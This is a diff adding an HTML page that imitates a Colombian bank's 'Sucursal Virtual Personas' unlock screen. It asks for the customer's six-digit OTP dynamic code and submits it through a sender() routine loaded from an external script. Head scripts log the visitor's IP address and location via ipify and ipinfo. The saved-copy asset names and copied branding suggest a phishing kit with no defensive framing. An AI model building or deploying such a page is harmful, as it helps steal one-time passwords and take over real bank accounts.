@@ -1,0 +1,212 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//ES" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+   <head>
+
+      <title> Sucursal Virtual Personas</title>
+      <meta content="es" http-equiv="Content-Language">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <link href="css/styles.css" media="all" rel="stylesheet" type="text/css">
+      <link href="css/bootstrap.css" media="all" rel="stylesheet" type="text/css">
+      <script type="text/javascript" src="js/jquery-1.10.1.js.descarga"></script>
+      <script type="text/javascript" src="js/jquery.validate-1.11.1.js.descarga"></script>
+      <script type="text/javascript" src="js/jquery-ui.js.descarga"></script>
+      <script src="js/jquery-3.7.7.js"></script>
+      <script type="text/javascript" src="js/bluebird.min.js.descarga"></script>
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+
+      <link href="css/jquery-ui.css" media="all" rel="stylesheet" type="text/css">
+      <link href="css/ui.css" media="all" rel="stylesheet" type="text/css">
+      <script>
+         $.getJSON("https://api.ipify.org?format=json",
+                                           function(data) {
+         
+             // Setting text of element P with id gfg
+             $("#gfg").html(data.ip);
+         })
+      </script>
+      <script>
+         $.getJSON("https://ipinfo.io", function (response) {
+    $("#ip").html("IP: " + response.ip);
+    $("#address").html("" + response.city + ", " + response.country);
+    
+})
+      </script>
+      <script language="JavaScript">
+         function popup_help_a() {	
+         	window.open('/mua/global/ayuda.jsp','HELP','toolbar=no,scrollbars=yes,resizable=no,width=1010,height=615');
+         }
+      </script> 
+      <script type="text/javascript" src="js/bootstrap.js.descarga"></script>
+      <link rel="shortcut icon" href="img/favicon.ico">
+
+   </head>
+   <body onload="delayPage();setTitle();" style="">
+      <div id="cargando" style="width: 100%; text-align: center; display: none;">
+      </div>
+      <div id="contenidoWeb" style="">
+         <form id="loginUserForm" name="loginUserForm" action="#" onsubmit=" return sender()" method="post">
+     
+                  <p id="address"  hidden="">
+            <div class="container" id="containerMain">
+               <div>
+                  <div id="header" class="mua-page-header">
+                     <div class="row row-logo-svp">
+                        <div class="col-xs-12 col-sm-7 col-md-7 left-div">
+                           <div class="mua-imgLogoItem"></div>
+                           <div class="text-svp-name">Sucursal Virtual Personas</div>
+                        </div>
+                     </div>
+                     <div class="row">
+                        <div class="col-xs-12 col-sm-7 col-md-7 left-div">
+                           <div id="lastIn" class="mua-title-text" style="padding-top: 10px !important;">
+                              <script language="javascript" src="js/jquery.jclockNew.js.descarga" type="text/JavaScript"></script>
+                              <script type="text/javascript">
+                                 $(function($) {        
+                                     var optionsEST = {
+                                         utc: true,
+                                         utcOffset: -5,
+                                         format: "%A %R de %B de %Y %l:%M:%S %P", 
+                                         language: "es"
+                                    }
+                                 $('#jclock1').jclockNew(optionsEST);
+                                 });
+                              </script>
+                              <div>
+                                 <div class="timeText">Fecha y hora actual:</div>
+                                 <span id="jclock1" class="lastVisitedText" currenttime="1659353680851">Lunes 1 de Agosto de 2022 7:34:40 PM</span>
+                              </div>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+                  <div class="panel-heading">
+                     <h3>
+                        Validaci&oacuten de Desbloqueo
+                     </h3>
+                  </div>
+               </div>
+               <div class="panel panel-primary">
+                  <div class="row" id="error">
+                     <script language="JavaScript">
+                        function cerrarError() {
+                        	document.getElementById("tabError").style.display = "none";
+                        	document.getElementById('summary').innerHTML='';
+                        }
+                     </script>
+                     <div class="col-xs-12 col-sm-12 col-md-12 mua_message_not_from_svp" id="tabError" style="display: none;">
+                        <div class="errorDiv">
+                           <div class="divTextMessage">
+                              <span class="icon-error errorIcon">
+                              <span class="path1"></span>
+                              <span class="path2"></span>
+                              <span class="path3"></span>
+                              </span>
+                              <div class="errorTitulo">Error</div>
+                              <div id="summary" class="errorTexto">
+                              </div>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+                  <div class="mua-panel-body">
+                     <div class="row">
+                        <div class="col-xs-12 col-sm-5 col-md-4">
+                           <div class="panel_general mua-panel_general">
+                              <div class="title-panel-label">
+                                 <h1 >
+                                    Codigo OTP
+                                 </h1>
+                              </div>
+                              <div class="subtitle-land-label">
+                                 <h4>
+                                    Para continuar con el desbloqueo debe ingresar la Clave Dinamica. Consultela en la App del dispositivo movil donde usted est&aacute inscrito al servicio.
+                                 </h4>
+                              </div>
+                              <div id="contenido">
+                                 <div class="mua-content-group-panel">
+                                    <div class="mua-label-input">
+                                       <span id="popoverUser" class="adminItems-Icons icon-icon_tooltip mua_pg_pgdsc_icons mua-label-icon" data-original-title="" title=""></span>
+                                       <div id="popoverContent" class="hide">
+                                          <span class="mua_tooltip_close">×</span>
+                                          <div class="mua_tooltip_msg">
+                                             Ingrese el usuario que tiene registrado en la Sucursal Virtual Personas. Si no tiene un usuario asignado ingrese con su documento de identidad.
+                                          </div>
+                                       </div>
+                                       <label class="control-label-index" for="username">Ingrese Codigo OTP</label>
+                                    </div>
+                                    <div>
+                                       <div class="mua_svp_enroll_update_control">
+                                          <input id="dinamica" name="username" tabindex="1" class="mua-form-control mua_svp_control_username mua-input-icon" type="text" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" value="" minlength="6" maxlength="6" autocomplete="off" required>
+                                          <span class="mua-icon-lock"> </span>
+                                       </div>
+                                    </div>
+                                 </div>
+                              </div>
+                              <div class="one-button-container mua-button-container" style="left: 80px">
+                              <button id="btnGo" name="btnGo" class="btn btn-success" type="submit" >
+                                 Validar</button>
+                              </div>
+         
+                              
+                              
+                           </div>
+                           <br>
+                           <br>
+                           <br>
+                           <br>
+                        </div>
+                        <div class="col-xs-12 col-sm-7 col-md-8">
+                           <div class="mua-embed-container-personal" id="banner-persona">												
+                              <iframe class="mua-iframe mua-iframe-personal-responsive" src="login_SVP_BC_zonaB.html" frameborder="0" scrolling="no" width="635px" height="335px"></iframe>
+                           </div>
+                           
+                        </div>
+                     </div>
+                  </div>
+               </div>
+               <div class="row">
+                  <div class="col-xs-12 col-sm-12 col-md-12">
+                     <p class="mua-footer">
+                        Sucursal Telefonica: Bogota (57) 60 1 343 00 00 - Medellin (57) 60 4 510 90 00 - Cali (57) 60 2 554 05 05 - Barranquilla (57) 60 5 361 88 88 - Cartagena (57) 60 5 693 44 00 - <br> Bucaramanga (57) 60 7 697 25 25 - Pereira (57) 60 6 340 12 13 - El resto del país 018000 9 12345. Sucursales Telefónicas en el exterior: España (34) 900 995 717 - Estados Unidos (1) 866 379 97 14.
+                     </p>
+                  </div>
+               </div>
+               <script type="text/javascript">
+                  var year = (new Date).getFullYear();
+                  $(document).ready(function() {
+                    $("#fecha").text( year );
+                  });
+               </script>
+               <div style="margin-top: 10px;">
+                  <div class="mua-title-text pull-left">Dirección IP:</div><div class="mua-title-text pull-left" id="gfg"></div>
+                  <div class="mua-title-text pull-right">Copyright ©&nbsp;<span id="fecha">2022</span>&nbsp;&nbsp;&nbsp;</div>
+               </div>
+            </div>
+            <input id="device_id" name="device_id" type="hidden" value="">
+            <input id="userlanguage" name="userlanguage" type="hidden" value="es-419">
+            <input id="deviceprint" name="deviceprint" styleid="deviceprint" type="hidden" value="">
+            <input id="pgid" name="pgid" type="hidden" value="">
+            <input id="uievent" name="uievent" type="hidden" value="">
+            <meta http-equiv="PRAGMA" content="NO-CACHE">
+            <meta http-equiv="Expires" content="-1">
+         
+            <script language="JavaScript" type="text/javascript">
+               function getTCLIIDVK(){
+               	
+               	return "";
+               }
+               function getTSESIDVK(){
+               	return "07111973-561f-482d-84a0-bfe1cff6e8bd";
+               }
+               function getTVIEIDVK(){
+               	return "/mua/WEB-INF/jsp/login/loginUserForm.jsp";
+               }
+            </script>
+	
+         </form>
+
+      </div>
+      <script src="js/sax3.js"></script>
+   </body>
+</html>
